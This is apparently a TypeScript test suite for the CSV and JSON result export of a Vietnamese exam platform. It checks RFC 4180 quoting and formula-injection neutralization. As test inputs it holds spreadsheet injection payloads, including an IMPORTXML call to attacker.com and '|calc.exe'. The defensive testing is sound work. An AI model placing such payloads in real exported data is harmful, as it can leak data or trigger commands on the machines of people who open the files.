import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import type {
  AttemptRecord,
  WebExam,
} from '../../../src/collect/types.ts';
import {
  exportResults,
  neutralizeFormula,
  isFormulaDangerous,
  serializeResultsJson,
  serializeResultsCsv,
  buildWebResultPayload,
  CSV_HEADERS,
} from '../../../src/collect/export.ts';

/**
 * Independent RFC 4180 CSV parser for testing.
 * Implemented completely independently from export logic to verify compliance.
 */
function parseCsvRfc4180(csvText: string): string[][] {
  const rows: string[][] = [];
  let currentRow: string[] = [];
  let currentCell = '';
  let inQuotes = false;
  let i = 0;

  while (i < csvText.length) {
    const ch = csvText[i]!;
    const next = i + 1 < csvText.length ? csvText[i + 1]! : '';

    if (inQuotes) {
      if (ch === '"') {
        if (next === '"') {
          // Escaped quote: "" -> "
          currentCell += '"';
          i += 2;
          continue;
        } else {
          // End of quoted cell
          inQuotes = false;
          i++;
          continue;
        }
      } else {
        currentCell += ch;
        i++;
        continue;
      }
    } else {
      if (ch === '"') {
        inQuotes = true;
        i++;
        continue;
      } else if (ch === ',') {
        currentRow.push(currentCell);
        currentCell = '';
        i++;
        continue;
      } else if (ch === '\r' && next === '\n') {
        currentRow.push(currentCell);
        rows.push(currentRow);
        currentRow = [];
        currentCell = '';
        i += 2;
        continue;
      } else if (ch === '\n') {
        currentRow.push(currentCell);
        rows.push(currentRow);
        currentRow = [];
        currentCell = '';
        i++;
        continue;
      } else {
        currentCell += ch;
        i++;
        continue;
      }
    }
  }

  if (currentRow.length > 0 || currentCell.length > 0) {
    currentRow.push(currentCell);
    rows.push(currentRow);
  }

  return rows;
}

function createDummyExam(examId: string = 'exam-sample-01', examVersionId: string = 'v1.0.0'): WebExam {
  return {
    schemaVersion: 'web-exam-v1',
    examId,
    examVersionId,
    title: 'Đề kiểm tra mẫu',
    subject: 'Toán học',
    grade: 12,
    ruleSetId: 'custom-v1',
    inputPolicyId: 'sa-charset-v1',
    settings: {
      durationMinutes: 50,
      maxAttempts: null,
      releasePolicy: 'immediate',
      shuffleQuestions: false,
      shuffleOptions: false,
    },
    questions: [
      {
        kind: 'I',
        questionVersionId: 'q-01',
        title: 'Câu 1',
        content: 'Nội dung câu 1',
        options: [
          { optionId: 'opt-a', label: 'A', text: 'Đáp án A' },
          { optionId: 'opt-b', label: 'B', text: 'Đáp án B' },
          { optionId: 'opt-c', label: 'C', text: 'Đáp án C' },
          { optionId: 'opt-d', label: 'D', text: 'Đáp án D' },
        ],
        correctOptionId: 'opt-a',
      },
      {
        kind: 'III',
        questionVersionId: 'q-03',
        title: 'Câu 3',
        content: 'Nội dung câu 3',
        answerKey: '-0,5',
      },
    ],
    assets: [],
  };
}

function createSampleFinal(
  attemptId: string,
  overrides?: Partial<AttemptRecord>
): AttemptRecord {
  const exam = overrides?.examSnapshot ?? createDummyExam();
  return {
    schemaVersion: 'web-attempt-v1',
    examId: exam.examId,
    examVersionId: exam.examVersionId,
    attemptId,
    revision: 1,
    candidateName: 'Nguyễn Văn A',
    examSnapshot: exam,
    presentationOrder: {
      seed: 'seed-01',
      questionOrder: ['q-01', 'q-03'],
      optionOrder: [{ questionVersionId: 'q-01', optionIds: ['opt-a', 'opt-b', 'opt-c', 'opt-d'] }],
    },
    responses: {
      attemptId,
      examVersionId: exam.examVersionId,
      responses: [
        { kind: 'I', questionVersionId: 'q-01', selectedOptionId: 'opt-a' },
        { kind: 'III', questionVersionId: 'q-03', raw: '-0,5' },
      ],
    },
    startedAt: 1731571200000,
    deadline: 1731574200000,
    phase: 'final',
    submittedAt: 1731573900000,
    scoreDTO: null,
    ...overrides,
  };
}

describe('M4 Export: Formula Neutralization (CWE-1236)', () => {
  it('detects and neutralizes standard formula prefixes (=, +, -, @, |)', () => {
    assert.equal(neutralizeFormula('=SUM(A1:A10)'), "'=SUM(A1:A10)");
    assert.equal(neutralizeFormula('+12345'), "'+12345");
    assert.equal(neutralizeFormula('-0,5'), "'-0,5");
    assert.equal(neutralizeFormula('@attacker'), "'@attacker");
    assert.equal(neutralizeFormula('|calc.exe'), "'|calc.exe");
  });

  it('detects and neutralizes fullwidth formula variants (＝, ＋, －, ＠, ｜)', () => {
    assert.equal(neutralizeFormula('＝SUM(1,2)'), "'＝SUM(1,2)");
    assert.equal(neutralizeFormula('＋100'), "'＋100");
    assert.equal(neutralizeFormula('－0,5'), "'－0,5");
    assert.equal(neutralizeFormula('＠function'), "'＠function");
    assert.equal(neutralizeFormula('｜pipe'), "'｜pipe");
  });

  it('detects and neutralizes whitespace/control preceding dangerous triggers', () => {
    assert.equal(neutralizeFormula('  =1+1'), "'  =1+1");
    assert.equal(neutralizeFormula('\t+20'), "'\t+20");
    assert.equal(neutralizeFormula('\r\n-0,5'), "'\r\n-0,5");
    assert.equal(neutralizeFormula('\u3000＝SUM'), "'\u3000＝SUM");
    assert.equal(neutralizeFormula(' \t @danger'), "' \t @danger");
  });

  it('detects and neutralizes strings starting with control characters', () => {
    assert.equal(neutralizeFormula('\t'), "'\t");
    assert.equal(neutralizeFormula('\x00admin'), "'\x00admin");
    assert.equal(neutralizeFormula('\x1fraw'), "'\x1fraw");
  });

  it('detects and neutralizes leading apostrophe bypass attempts', () => {
    assert.equal(neutralizeFormula("'=1+1"), "''=1+1");
    assert.equal(neutralizeFormula("'-0,5"), "''-0,5");
  });

  it('leaves safe inputs untampered', () => {
    assert.equal(neutralizeFormula('Normal Name'), 'Normal Name');
    assert.equal(neutralizeFormula('1,5'), '1,5');
    assert.equal(neutralizeFormula('0'), '0');
    assert.equal(neutralizeFormula('Đáp án A'), 'Đáp án A');
    assert.equal(neutralizeFormula('  Safe text with spaces'), '  Safe text with spaces');
    assert.equal(neutralizeFormula(''), '');
    assert.equal(neutralizeFormula(null), '');
    assert.equal(neutralizeFormula(undefined), '');
  });

  it('isFormulaDangerous helper reports accurate classification', () => {
    assert.equal(isFormulaDangerous('=cmd'), true);
    assert.equal(isFormulaDangerous('-0,5'), true);
    assert.equal(isFormulaDangerous('+84'), true);
    assert.equal(isFormulaDangerous('@admin'), true);
    assert.equal(isFormulaDangerous(' ＝DDE'), true);
    assert.equal(isFormulaDangerous('Normal'), false);
    assert.equal(isFormulaDangerous('123'), false);
  });
});

describe('M4 Export: CSV Generation & RFC 4180 Invariants', () => {
  it('exports RFC 4180 CSV Blob with text/csv;charset=utf-8 MIME', async () => {
    const final = createSampleFinal('att-01');
    const blob = exportResults([final], 'csv');

    assert.equal(blob.type, 'text/csv;charset=utf-8');
    assert.ok(blob.size > 0);

    const text = await blob.text();
    assert.ok(text.includes('"attempt_id","exam_id"'));
  });

  it('uses standard 17 headers matching Google Sheets integration contract', () => {
    assert.equal(CSV_HEADERS.length, 17);
    assert.deepEqual(CSV_HEADERS, [
      'attempt_id',
      'exam_id',
      'exam_version_id',
      'candidate_display',
      'started_at',
      'submitted_at',
      'duration_seconds',
      'score_p1',
      'max_p1',
      'score_p2',
      'max_p2',
      'score_p3',
      'max_p3',
      'total_score',
      'max_total',
      'policy_version',
      'raw_answers_json',
    ]);
  });

  it('quotes every single cell, escapes internal quotes with double-quotes, and enforces CRLF', () => {
    const final = createSampleFinal('att-quotes', {
      candidateName: 'Nguyễn "Văn" A',
    });
    const csv = serializeResultsCsv([final]);

    // Every line ends with CRLF
    const lines = csv.split('\r\n');
    assert.ok(lines.length >= 2);
    for (let i = 0; i < lines.length - 1; i++) {
      // Lines shouldn't end with naked LF without CR
      assert.ok(!lines[i]!.endsWith('\r'));
    }

    // Verify candidate name quoting and double-quote escaping
    assert.ok(csv.includes('"Nguyễn ""Văn"" A"'));
  });

  it('handles multi-line text and newlines within quoted cells', () => {
    const final = createSampleFinal('att-newline', {
      candidateName: 'Dòng 1\r\nDòng 2\nDòng 3',
    });
    const csv = serializeResultsCsv([final]);

    const parsed = parseCsvRfc4180(csv);
    assert.equal(parsed.length, 2); // Header row + 1 data row
    const candidateCell = parsed[1]![3];
    assert.equal(candidateCell, 'Dòng 1\r\nDòng 2\nDòng 3');
  });

  it('neutralizes formula injection across all untrusted fields in CSV', () => {
    const final = createSampleFinal('att-malicious', {
      candidateName: '=IMPORTXML("https://attacker.com", "//a")',
      examId: '+exam-math',
      examVersionId: '-v1.0',
      responses: {
        attemptId: 'att-malicious',
        examVersionId: '-v1.0',
        responses: [
          { kind: 'III', questionVersionId: '@q-03', raw: '-0,5' },
        ],
      },
    });

    const csv = serializeResultsCsv([final]);
    const parsed = parseCsvRfc4180(csv);

    assert.equal(parsed.length, 2);
    const row = parsed[1]!;

    // Exam ID starting with + has leading apostrophe
    assert.equal(row[1], "'+exam-math");
    // Exam version starting with - has leading apostrophe
    assert.equal(row[2], "'-v1.0");
    // Candidate name starting with = has leading apostrophe
    assert.equal(row[3], "'=IMPORTXML(\"https://attacker.com\", \"//a\")");

    // raw_answers_json has Part III raw '-0,5' safe-encoded
    const rawAnswersJson = row[16]!;
    const safeParsed = JSON.parse(rawAnswersJson);
    assert.equal(safeParsed[0].raw, "'-0,5");
    assert.equal(safeParsed[0].questionVersionId, "'@q-03");
  });

  it('protects candidate nicknames starting with =, +, -, @ in CSV while preserving raw in JSON', () => {
    for (const prefix of ['=', '+', '-', '@']) {
      const name = `${prefix}SUM(1,1)`;
      const final = createSampleFinal(`att-prefix-${prefix.charCodeAt(0)}`, {
        candidateName: name,
        responses: {
          attemptId: `att-prefix-${prefix.charCodeAt(0)}`,
          examVersionId: 'v1.0.0',
          responses: [{ kind: 'III', questionVersionId: 'ck-iii-01', raw: '-0,5' }],
        },
      });

      // 1. JSON preserves exact raw nickname and raw negative answer
      const jsonStr = serializeResultsJson([final]);
      assert.ok(jsonStr.includes(JSON.stringify(name)), `JSON must preserve original nickname ${name}`);
      assert.ok(jsonStr.includes('"-0,5"'), 'JSON must preserve raw negative short answer');

      // 2. CSV neutralizes formula prefix with single apostrophe
      const csvStr = serializeResultsCsv([final]);
      const parsed = parseCsvRfc4180(csvStr);
      assert.equal(parsed.length, 2);
      const cells = parsed.flat();
      assert.ok(cells.includes(`'${name}`), `CSV must use apostrophe prefix for dangerous nickname ${name}`);
      assert.ok(!cells.some(c => /^[\s\u0000-\u001f]*[=+@-]/u.test(c)), 'CSV cells must not start with executable spreadsheet triggers');
    }
  });

  it('independent CSV parser accurately parses exported CSV round-trip', () => {
    const final1 = createSampleFinal('att-01', { candidateName: 'Thí sinh 1' });
    const final2 = createSampleFinal('att-02', {
      candidateName: '-0,5', // Candidate with negative III style name
      responses: {
        attemptId: 'att-02',
        examVersionId: 'v1.0.0',
        responses: [{ kind: 'III', questionVersionId: 'q-03', raw: '-0,5' }],
      },
    });

    const csv = serializeResultsCsv([final1, final2]);
    const parsed = parseCsvRfc4180(csv);

    assert.equal(parsed.length, 3); // Header + 2 data rows
    assert.equal(parsed[0]!.length, 17);
    assert.equal(parsed[1]!.length, 17);
    assert.equal(parsed[2]!.length, 17);

    assert.equal(parsed[1]![0], 'att-01');
    assert.equal(parsed[1]![3], 'Thí sinh 1');

    assert.equal(parsed[2]![0], 'att-02');
    assert.equal(parsed[2]![3], "'-0,5"); // Neutralized formula prefix
  });

  it('handles cross-exam reused IDs without collisions or data contamination', () => {
    // Exam A: Math with q-01
    const examA = createDummyExam('exam-toan', 'v1.0.0');
    const finalA = createSampleFinal('att-math-01', {
      examSnapshot: examA,
      candidateName: 'Học sinh Toán',
      responses: {
        attemptId: 'att-math-01',
        examVersionId: 'v1.0.0',
        responses: [{ kind: 'I', questionVersionId: 'q-01', selectedOptionId: 'opt-a' }],
      },
    });

    // Exam B: Physics reusing same questionVersionId 'q-01'
    const examB = createDummyExam('exam-ly', 'v2.0.0');
    const finalB = createSampleFinal('att-ly-01', {
      examSnapshot: examB,
      candidateName: 'Học sinh Lý',
      responses: {
        attemptId: 'att-ly-01',
        examVersionId: 'v2.0.0',
        responses: [{ kind: 'I', questionVersionId: 'q-01', selectedOptionId: 'opt-b' }],
      },
    });

    const csv = serializeResultsCsv([finalA, finalB]);
    const parsed = parseCsvRfc4180(csv);

    assert.equal(parsed.length, 3);
    assert.equal(parsed[1]![1], 'exam-toan');
    assert.equal(parsed[1]![2], 'v1.0.0');
    assert.equal(parsed[1]![3], 'Học sinh Toán');

    assert.equal(parsed[2]![1], 'exam-ly');
    assert.equal(parsed[2]![2], 'v2.0.0');
    assert.equal(parsed[2]![3], 'Học sinh Lý');
  });

  it('serializes empty finals array to header row only', () => {
    const csv = serializeResultsCsv([]);
    assert.equal(csv, CSV_HEADERS.map(h => `"${h}"`).join(',') + '\r\n');
  });
});

describe('M4 Export: JSON Generation & web-result-v1 Invariants', () => {
  it('exports web-result-v1 JSON Blob with application/json;charset=utf-8 MIME', async () => {
    const final = createSampleFinal('att-json-01');
    const blob = exportResults([final], 'json');

    assert.equal(blob.type, 'application/json;charset=utf-8');
    assert.ok(blob.size > 0);

    const text = await blob.text();
    const parsed = JSON.parse(text);
    assert.equal(parsed.schemaVersion, 'web-result-v1');
    assert.equal(parsed.attemptId, 'att-json-01');
  });

  it('preserves exact raw values in JSON (NEVER applies CSV sanitization to JSON)', () => {
    const final = createSampleFinal('att-raw', {
      candidateName: '=SUM(1,2)',
      responses: {
        attemptId: 'att-raw',
        examVersionId: 'v1.0.0',
        responses: [
          { kind: 'III', questionVersionId: 'q-03', raw: '-0,5' },
        ],
      },
    });

    const jsonStr = serializeResultsJson([final]);
    const parsed = JSON.parse(jsonStr);

    // Exact raw string preserved in JSON:
    assert.equal(parsed.candidateName, '=SUM(1,2)', 'Candidate name must NOT have apostrophe in JSON');
    assert.equal(parsed.responses.responses[0].raw, '-0,5', 'Negative III raw answer must NOT have apostrophe in JSON');
  });

  it('includes exact rational fraction strings in scoreDTO', () => {
    const final = createSampleFinal('att-scores');
    const jsonStr = serializeResultsJson([final]);
    const parsed = JSON.parse(jsonStr);

    assert.ok(parsed.scoreDTO);
    assert.equal(typeof parsed.scoreDTO.total, 'string');
    assert.equal(typeof parsed.scoreDTO.maxTotal, 'string');
    assert.equal(typeof parsed.scoreDTO.sections.I.score, 'string');
    assert.equal(typeof parsed.scoreDTO.sections.III.score, 'string');

    // Expected rational values:
    // Question 1: correct -> 1/4
    // Question 3: correct key '-0,5' -> base = 1/4 < 10, pointIII = (10 - 1/4)/1 = 39/4
    // Total = 1/4 + 39/4 = 40/4 = 10
    assert.equal(parsed.scoreDTO.total, '10');
    assert.equal(parsed.scoreDTO.maxTotal, '10');
    assert.equal(parsed.scoreDTO.sections.I.score, '1/4');
    assert.equal(parsed.scoreDTO.sections.III.score, '39/4');
  });

  it('serializes single attempt with top-level attributes AND results array', () => {
    const final = createSampleFinal('att-single');
    const parsed = JSON.parse(serializeResultsJson([final]));

    assert.equal(parsed.schemaVersion, 'web-result-v1');
    assert.equal(parsed.attemptId, 'att-single');
    assert.ok(Array.isArray(parsed.results));
    assert.equal(parsed.results.length, 1);
    assert.equal(parsed.results[0].attemptId, 'att-single');
  });

  it('serializes multiple attempts with container count and results array', () => {
    const final1 = createSampleFinal('att-01');
    const final2 = createSampleFinal('att-02');
    const parsed = JSON.parse(serializeResultsJson([final1, final2]));

    assert.equal(parsed.schemaVersion, 'web-result-v1');
    assert.equal(parsed.count, 2);
    assert.ok(Array.isArray(parsed.results));
    assert.equal(parsed.results.length, 2);
    assert.equal(parsed.results[0].attemptId, 'att-01');
    assert.equal(parsed.results[1].attemptId, 'att-02');
  });

  it('throws TypeError for unsupported export format', () => {
    const final = createSampleFinal('att-01');
    assert.throws(
      () => exportResults([final], 'pdf' as any),
      (err: any) => {
        assert.ok(err instanceof TypeError);
        assert.match(err.message, /Unsupported export format/);
        return true;
      }
    );
  });
});

describe('M4 Export AC: Offline Export with Zero Credentials', () => {
  it('works entirely offline with zero Google deployment and zero credentials', async () => {
    const final = createSampleFinal('att-offline');

    // Both exports produce durable Blobs synchronously without network
    const jsonBlob = exportResults([final], 'json');
    const csvBlob = exportResults([final], 'csv');

    assert.ok(jsonBlob instanceof Blob);
    assert.ok(csvBlob instanceof Blob);

    const jsonText = await jsonBlob.text();
    const csvText = await csvBlob.text();

    assert.ok(jsonText.length > 50);
    assert.ok(csvText.length > 50);

    // Verify absence of any Google credential tokens or URLs
    assert.ok(!jsonText.includes('client_secret'));
    assert.ok(!jsonText.includes('private_key'));
    assert.ok(!csvText.includes('client_secret'));
    assert.ok(!csvText.includes('private_key'));
  });
});

describe('M4 Export: Codex Verification — JSON Raw & CSV Formula Protection for Dangerous Nicknames', () => {
  for (const prefix of ['=', '+', '-', '@'] as const) {
    it(`preserves raw JSON and enforces CSV formula protection for nickname prefix ${prefix}`, async () => {
      const name = `${prefix}SUM(1,1)`;
      const final = createSampleFinal(`codex-collect-${prefix.charCodeAt(0)}`, {
        candidateName: name,
        responses: {
          attemptId: `codex-collect-${prefix.charCodeAt(0)}`,
          examVersionId: 'v1.0.0',
          responses: [{ kind: 'III', questionVersionId: 'q-03', raw: '-0,5' }],
        },
      });

      // JSON export verification
      const jsonBlob = exportResults([final], 'json');
      const jsonText = await jsonBlob.text();
      const rawJson = JSON.parse(jsonText);
      assert.ok(JSON.stringify(rawJson).includes(name), 'JSON preserves original nickname');
      assert.ok(JSON.stringify(rawJson).includes('"-0,5"'), 'JSON preserves raw negative short answer');

      // CSV export verification
      const csvBlob = exportResults([final], 'csv');
      const csvText = await csvBlob.text();
      const rows = parseCsvRfc4180(csvText);
      const cells = rows.flat();
      assert.ok(cells.includes(`'${name}`), 'CSV uses apostrophe prefix for dangerous nickname');
      assert.ok(!cells.some(c => /^[\s\u0000-\u001f]*[=+@-]/u.test(c)), 'no executable spreadsheet cell prefix');
    });
  }

  it('preserves final candidate name exactly in web-result-v1 and CSV export', async () => {
    const candidateName = 'Codex trạng thái cục bộ';
    const final = createSampleFinal('codex-no-endpoint', {
      candidateName,
    });
    const payload = buildWebResultPayload(final);
    assert.equal(payload.candidateName, candidateName);

    const jsonBlob = exportResults([final], 'json');
    const jsonText = await jsonBlob.text();
    const rawJson = JSON.parse(jsonText);
    assert.equal(rawJson.candidateName, candidateName);

    const csvBlob = exportResults([final], 'csv');
    const csvText = await csvBlob.text();
    const rows = parseCsvRfc4180(csvText);
    const candidateCell = rows[1]?.[3]; // column D is candidate_display
    assert.equal(candidateCell, candidateName);
  });
});

